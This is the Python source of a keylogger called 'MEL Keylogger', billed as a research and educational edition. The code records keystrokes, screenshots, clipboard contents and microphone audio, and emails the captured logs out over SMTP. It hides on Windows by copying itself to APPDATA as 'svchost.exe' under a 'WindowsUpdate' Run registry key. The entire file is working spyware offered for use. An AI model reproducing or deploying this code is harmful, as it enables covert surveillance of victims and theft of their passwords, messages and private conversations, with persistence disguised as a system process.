import os
import sys
import time
import smtplib
import logging
import traceback
import argparse
import base64
import zlib
from datetime import datetime
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# OS-specific imports
import platform
OS_NAME = platform.system()
if OS_NAME == "Windows":
    import win32clipboard
    import winreg
from pynput import keyboard
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
from cryptography.fernet import Fernet

def show_banner():
    banner = r"""
███╗   ███╗███████╗██╗     
████╗ ████║██╔════╝██║     
██╔████╔██║█████╗  ██║     
██║╚██╔╝██║██╔══╝  ██║     
██║ ╚═╝ ██║███████╗███████╗
╚═╝     ╚═╝╚══════╝╚══════╝

       M E L   K E Y L O G G E R
     Research & Educational Edition
"""
    print(banner)


# ---------------- CONFIGURATION ---------------- #
CONFIG_PATH = "keylogger.conf"

# Interval settings
SCREENSHOT_INTERVAL = 60  # in seconds
AUDIO_DURATION = 10  # seconds
LOG_ENCRYPTION_KEY = Fernet.generate_key()  # or use persistent key

# ---------------- UTILS ---------------- #
def load_config(path):
    import configparser
    config = configparser.ConfigParser()
    config.read(path)
    section = config["EMAIL"]
    email = section["address"]
    password = section["password"]
    smtp_host = section.get("smtp_host", "smtp.office365.com")
    smtp_port = section.getint("smtp_port", 587)
    return email, password, smtp_host, smtp_port

def encrypt_data(data, key):
    f = Fernet(key)
    return f.encrypt(data.encode() if isinstance(data, str) else data)

def compress_data(data):
    return base64.b64encode(zlib.compress(data.encode() if isinstance(data, str) else data))

def send_email(email, password, smtp_host, smtp_port, subject, message, attachments=None):
    try:
        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = email
        msg["Subject"] = subject
        msg.attach(MIMEText(message, "plain"))

        # Attach files
        if attachments:
            from email.mime.base import MIMEBase
            from email import encoders
            for filepath in attachments:
                with open(filepath, "rb") as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(filepath)}")
                    msg.attach(part)

        server = smtplib.SMTP(smtp_host, smtp_port)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        server.quit()
        print(f"{datetime.now()} - Email sent")
    except Exception:
        logging.error("Error sending email:\n" + traceback.format_exc())

# ---------------- KEYLOGGER CLASS ---------------- #
class ProKeylogger:
    def __init__(self, interval=60, report_method="email", log_dir="logs", compress=True):
        self.interval = interval
        self.report_method = report_method
        self.log_dir = log_dir
        os.makedirs(log_dir, exist_ok=True)
        self.compress = compress
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        logging.basicConfig(filename=os.path.join(log_dir, 'debug.log'), level=logging.INFO,
                            format='%(asctime)s %(levelname)s: %(message)s', force=True)
        # Load email config
        self.email = None
        self.password = None
        self.smtp_host = None
        self.smtp_port = None
        try:
            self.email, self.password, self.smtp_host, self.smtp_port = load_config(CONFIG_PATH)
        except Exception as e:
            logging.error("Could not load config: %s", e)

    # ---------------- KEYLOGGER ---------------- #
    def callback(self, key):
        try:
            name = str(key).replace("'", "")
            if len(name) > 1:
                if "space" in name:
                    name = " "
                elif "enter" in name:
                    name = "[ENTER]\n"
                else:
                    name = f"[{name.upper()}]"
            self.log += name
        except Exception:
            logging.error("Error in callback:\n" + traceback.format_exc())

    # ---------------- FILENAME ---------------- #
    def update_filename(self, prefix="keylog"):
        start_str = self.start_dt.strftime("%Y%m%d-%H%M%S")
        end_str = self.end_dt.strftime("%Y%m%d-%H%M%S")
        return os.path.join(self.log_dir, f"{prefix}_{start_str}_{end_str}.txt")

    # ---------------- REPORT ---------------- #
    def report(self):
        try:
            if self.log:
                self.end_dt = datetime.now()
                filename = self.update_filename()
                data = self.log
                if self.compress:
                    data = compress_data(data).decode()
                with open(filename, "w") as f:
                    f.write(data)
                if self.report_method == "email":
                    send_email(self.email, self.password, self.smtp_host, self.smtp_port,
                               "Keylogger Logs", "Attached logs", attachments=[filename])
                self.log = ""
                self.start_dt = datetime.now()
        except Exception:
            logging.error("Error in report:\n" + traceback.format_exc())
        finally:
            Timer(self.interval, self.report).start()

    # ---------------- SCREENSHOT ---------------- #
    def screenshot(self):
        try:
            now = datetime.now().strftime("%Y%m%d-%H%M%S")
            filename = os.path.join(self.log_dir, f"screenshot_{now}.png")
            ImageGrab.grab().save(filename)
            logging.info(f"Screenshot saved: {filename}")
            Timer(SCREENSHOT_INTERVAL, self.screenshot).start()
        except Exception:
            logging.error("Error taking screenshot:\n" + traceback.format_exc())

    # ---------------- CLIPBOARD ---------------- #
    def clipboard(self):
        if OS_NAME != "Windows":
            return
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            filename = os.path.join(self.log_dir, f"clipboard_{datetime.now().strftime('%Y%m%d-%H%M%S')}.txt")
            with open(filename, "w", encoding="utf-8") as f:
                f.write(data)
            logging.info(f"Clipboard saved: {filename}")
            Timer(self.interval, self.clipboard).start()
        except Exception:
            logging.error("Error reading clipboard:\n" + traceback.format_exc())

    # ---------------- AUDIO ---------------- #
    def record_audio(self, seconds=AUDIO_DURATION):
        try:
            fs = 44100
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            filename = os.path.join(self.log_dir, f"audio_{datetime.now().strftime('%Y%m%d-%H%M%S')}.wav")
            write(filename, fs, recording)
            logging.info(f"Audio saved: {filename}")
            Timer(self.interval, self.record_audio).start()
        except Exception:
            logging.error("Error recording audio:\n" + traceback.format_exc())

    # ---------------- PERSISTENCE ---------------- #
    def persistence(self):
        if OS_NAME != "Windows":
            return
        try:
            exe_path = sys.executable
            target = os.path.join(os.environ["APPDATA"], "svchost.exe")
            if not os.path.exists(target):
                import shutil
                shutil.copyfile(exe_path, target)
            key = winreg.HKEY_CURRENT_USER
            registry = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(registry, "WindowsUpdate", 0, winreg.REG_SZ, target)
            winreg.CloseKey(registry)
            logging.info("Persistence added")
        except Exception:
            logging.error("Error adding persistence:\n" + traceback.format_exc())

    # ---------------- START ---------------- #
    def start(self):
        try:
            logging.info("Keylogger started")
            # Start timers
            self.report()
            self.screenshot()
            self.clipboard()
            self.record_audio()
            self.persistence()
            # Start keylogger
            with keyboard.Listener(on_release=self.callback) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("Stopped by user")
        except Exception:
            logging.error("Error in start:\n" + traceback.format_exc())

# ---------------- RUN ---------------- #
if __name__ == "__main__":
    show_banner()
    kl = ProKeylogger(interval=60, report_method="email", log_dir="logs")
    kl.start()
